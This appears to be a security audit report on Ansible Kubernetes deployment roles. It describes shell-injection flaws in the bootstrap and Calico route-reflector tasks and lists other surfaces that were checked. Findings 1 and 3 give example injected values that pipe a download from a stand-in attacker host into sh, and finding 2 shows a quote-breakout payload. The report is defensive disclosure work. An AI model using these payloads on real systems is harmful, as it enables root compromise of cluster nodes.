# Security research findings (2026-11-23) — injection / crypto / secrets / supply-chain

Commit reviewed: `b81967a90845074308c8d5c41930e018b7c59a5e`. Scope: remaining shell/raw injection, HTTP downloads, checksum gaps, secret modes, hardcoded credentials, contrib/bootstrap-os surfaces. Excludes the user already-reported list and flagged JSON findings 1–41.

## Candidates (MEDIUM+)

### 1. HIGH — Fedora CoreOS bootstrap shells unquoted `http_proxy` via `raw`

- **Primary file:** `roles/bootstrap-os/tasks/bootstrap-fedora-coreos.yml`
- **Evidence:** `roles/bootstrap-os/tasks/bootstrap-fedora-coreos.yml:18`, `roles/bootstrap-os/tasks/bootstrap-fedora-coreos.yml:23`, `cluster.yml:22`, `roles/bootstrap-os/defaults/main.yml:27`
- **Default vs opt-in:** Default path when hosts are Fedora CoreOS and Python bootstrap is needed. `skip_http_proxy_on_os_packages` defaults false; triggers whenever inventory defines `http_proxy`.
- **Attack chain:** Inventory (or group_vars) sets `http_proxy` to a value with shell metacharacters, e.g. `;curl http://attacker/x|sh;true`. `cluster.yml` runs `bootstrap-os` first. On FCOS the role executes `raw: "export http_proxy={{ http_proxy }};rpm-ostree ..."`, which Ansible runs through a remote shell with no quoting. The metacharacters execute as root during ostree package install → full node compromise before hostname asserts or kubeadm.
- **Why distinct:** Not in flagged JSON. Different from etcd/`access_ip` shell tasks and inventory_builder: this is early bootstrap `raw` on FCOS with completely unquoted proxy interpolation. Same bug is mirrored in `extra_playbooks/` and `contrib/network-storage/glusterfs/` copies.

### 2. HIGH — Debian/Ubuntu bootstrap breaks out of `raw` single quotes via `http_proxy` / `https_proxy`

- **Primary file:** `roles/bootstrap-os/tasks/bootstrap-debian.yml`
- **Evidence:** `roles/bootstrap-os/tasks/bootstrap-debian.yml:22-28`, `roles/bootstrap-os/tasks/bootstrap-debian.yml:38-44`, `roles/bootstrap-os/tasks/main.yml:30-31`
- **Default vs opt-in:** Default for `ID=debian` / `ID=ubuntu` when `http_proxy` or `https_proxy` is defined and apt does not already list a proxy (`skip_http_proxy_on_os_packages` false).
- **Attack chain:** Set `http_proxy` to `x'; id; echo '` (or a reverse-shell payload with the same quote breakout). Jinja renders `raw: echo 'Acquire::http::proxy "{{ http_proxy }}";' >> /etc/apt/apt.conf`. The embedded `'` closes the shell single-quoted string; subsequent commands run as root via `raw` before Python/apt modules are available. Same pattern for `https_proxy` on line 39. Affects every Ubuntu/Debian node in the inventory that uses an HTTP(S) proxy.
- **Why distinct:** Same class as finding #1 but a different breakout (quote termination inside `echo '...'`) on the much more common Debian/Ubuntu bootstrap path. Not covered by Amazon EPEL / Oracle extras HTTP findings.

### 3. HIGH — Calico route-reflector shell tasks interpolate unvalidated `calico_rr_id` / `calico_group_id`

- **Primary file:** `roles/network_plugin/calico/rr/tasks/update-node.yml` and `roles/network_plugin/calico/tasks/peer_with_calico_rr.yml`
- **Evidence:** `roles/network_plugin/calico/rr/tasks/update-node.yml:10`, `roles/network_plugin/calico/tasks/peer_with_calico_rr.yml:3`, `roles/network_plugin/calico/tasks/install.yml:469-471`, `docs/calico.md:177-180`
- **Default vs opt-in:** Opt-in. Requires `peer_with_calico_rr` (or calico_rr group usage) and defining `calico_rr_id` / `calico_group_id` in inventory (documented rack grouping).
- **Attack chain:** Inventory sets `calico_rr_id: "rr1;curl http://attacker/x|sh;#"`. Hostname assert only constrains `inventory_hostname` (safe alphanumeric). The shell task runs `/.../calicoctl.sh label node <host> calico-rr-id={{ calico_rr_id }} --overwrite` without quoting. Metacharacters execute as root on calico RR / peer nodes during CNI install. `calico_group_id` has the same pattern in `peer_with_calico_rr.yml:3`.
- **Why distinct:** Not hostname injection (hostname regex would block special chars in `inventory_hostname`). These are separate unvalidated inventory vars with no assert in `0020-verify-settings.yml` or calico `check.yml`. Different from flagged etcd `access_ip` / `etcd_member_name` shells.

## Checked surfaces — no additional MEDIUM+

- Already-reported / flagged 1–41 (inventory_builder, recover rm, etcd/remove-node shells, world-readable secrets, no_log gaps, ArgoCD, Amazon EPEL, Oracle extras, NVIDIA GTX HTTP, Heketi, vSphere TLS/terraform, ansible host_key_checking, unsafeSkipCAVerification, make-ssl-etcd hostname — triaged out by hostname assert)
- `subprocess shell=True`: only `contrib/inventory_builder/inventory.py` (already flagged)
- Download role: HTTPS + sha256 for kube/CNI/containerd/cri-o/runc/crictl/etcd/helm/calicoctl; `download_validate_certs: true`
- pip install: CI/tests only, no `--require-hashes` (test surface; not production node path)
- Secret/kubeconfig modes: node `cloud_config` 0640; localhost kubeconfig 0600; world-readable CCM already flagged
- Hardcoded sample passwords mostly commented (`argocd_admin_password`, vSphere samples); azurerm `admin_password: changeme` with `disablePasswordAuthentication: true` by default (password auth off); azurerm sample SSH public key is operator-replaceable sample (warned in comments) — not filed as exploitable default without auth enabled
- `|safe`: none; path traversal via inventory in `dest:` not found
- openssl: `certificates_key_size: 2048`, `certificates_duration: 36500` (100y already noted in prior auth hunt)
- `library/kube.py`: argv-safe `run_command`
- `scripts/*.sh`: hash generator HTTPS; `premoderator.sh` CI GitHub token-in-query (CI-only)
- contrib/aws_iam: IAM JSON only; contrib/dind: passwordless sudo for lab user; contrib/offline: unauthenticated registry already flagged; helm-apps: helm module only
- bootstrap-os other distros: centos/amazon/oracle already flagged; clearlinux/flatcar/fedora/opensuse — no new HTTP gpgcheck:0 or raw proxy injection (flatcar bootstrap.sh uses HTTPS+sha256 for pypy)
- extra_playbooks: mirrors of the same bootstrap/calico bugs (not separate products)
- Calico RR `inventory_hostname` in shell: blocked by hostname assert (same triage as make-ssl-etcd)
- Debian backports HTTP: apt still GPG-verifies packages with distro keys (no HTTP GPG key fetch) — below MEDIUM bar
- containerd `insecure_skip_verify` only when operator sets `containerd_insecure_registries`
